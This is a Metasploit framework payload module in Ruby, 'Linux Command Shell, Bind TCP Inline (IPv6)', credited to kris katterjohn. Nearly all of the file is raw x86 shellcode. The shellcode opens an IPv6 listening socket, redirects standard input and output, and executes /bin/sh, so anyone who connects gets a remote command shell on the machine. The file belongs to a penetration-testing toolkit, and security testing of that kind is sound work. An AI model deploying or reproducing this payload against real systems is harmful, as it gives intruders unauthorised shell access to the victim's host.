##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

module MetasploitModule
  CachedSize = 90

  include Msf::Payload::Single
  include Msf::Payload::Linux::X86::Prepends
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(
      merge_info(
        info,
        'Name' => 'Linux Command Shell, Bind TCP Inline (IPv6)',
        'Description' => 'Listen for a connection over IPv6 and spawn a command shell',
        'Author' => 'kris katterjohn',
        'License' => MSF_LICENSE,
        'Platform' => 'linux',
        'Arch' => ARCH_X86,
        'Handler' => Msf::Handler::BindTcp,
        'Session' => Msf::Sessions::CommandShellUnix,
        'Payload' => {
          'Offsets' => { 'LPORT' => [ 0x18, 'n' ] },
          'Payload' =>
                       "\x31\xdb\x53\x43\x53\x6a\x0a\x89\xe1\x6a\x66\x58\xcd\x80\x96" \
                       "\x99\x52\x52\x52\x52\x52\x52\x66\x68\xbf\xbf\x66\x68\x0a\x00" \
                       "\x89\xe1\x6a\x1c\x51\x56\x89\xe1\x43\x6a\x66\x58\xcd\x80\xb0" \
                       "\x66\xb3\x04\xcd\x80\x52\x52\x56\x89\xe1\x43\xb0\x66\xcd\x80" \
                       "\x93\x59\x6a\x3f\x58\xcd\x80\x49\x79\xf8\x68\x2f\x2f\x73\x68" \
                       "\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
        }
      )
    )
  end
end
